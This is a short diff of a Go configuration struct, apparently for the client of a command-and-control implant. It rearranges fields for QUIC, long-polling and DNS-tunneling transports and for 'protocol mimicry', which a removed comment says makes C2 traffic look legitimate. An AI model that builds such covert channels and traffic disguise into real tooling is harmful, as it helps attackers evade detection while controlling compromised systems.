@@ -36,15 +36,14 @@ var Config struct {
 	UUID   string `json:"uuid"`
 	Key    string `json:"key"`
 
-	// Transport fallback configuration
-	EnableTransportFallback bool   `json:"enable_transport_fallback"` // Enable WS→WSS→QUIC→LongPoll→DNS fallback
-	EnableQUIC              bool   `json:"enable_quic"`                // Enable QUIC transport
-	QUICPort                int    `json:"quic_port"`                  // QUIC port (default: 443)
-	DNSTunnelDomain         string `json:"dns_tunnel_domain"`          // Domain for DNS tunneling (e.g., "c2.example.com")
-	DNSServer               string `json:"dns_server"`                 // DNS server for tunneling (default: "8.8.8.8:53")
-
-	// Protocol mimicry (makes C2 traffic look legitimate)
-	EnableMimicry bool `json:"enable_mimicry"` // Enable protocol mimicry
+	// Transport fallback configuration (must match server generate.go clientCfg)
+	EnableQUIC     bool   `json:"enable_quic"`      // Enable QUIC transport
+	QUICPort       int    `json:"quic_port"`        // QUIC port (default: host port)
+	EnableLongPoll bool   `json:"enable_longpoll"`  // Enable long polling
+	EnableDNS      bool   `json:"enable_dns"`       // Enable DNS tunneling
+	DNSDomain      string `json:"dns_domain"`       // DNS domain for tunneling
+	DNSServer      string `json:"dns_server"`       // DNS server address
+	EnableMimicry  bool   `json:"enable_mimicry"`   // Enable protocol mimicry
 }
 
 type trailerFooter struct {
